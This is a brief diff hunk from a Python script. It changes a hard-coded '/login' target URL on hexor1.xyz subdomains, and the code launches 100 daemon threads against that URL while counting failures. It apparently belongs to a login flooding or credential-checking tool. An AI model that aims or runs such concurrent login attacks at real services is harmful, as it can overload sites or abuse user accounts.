@@ -37,7 +37,7 @@ def chek(url):
             with lock:
                 stats["failed"] += 1
 def start_threads():
-    target_url = "https://viphexor2.hexor1.xyz/login"
+    target_url = "https://kabos.hexor1.xyz/login"
     for _ in range(100):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
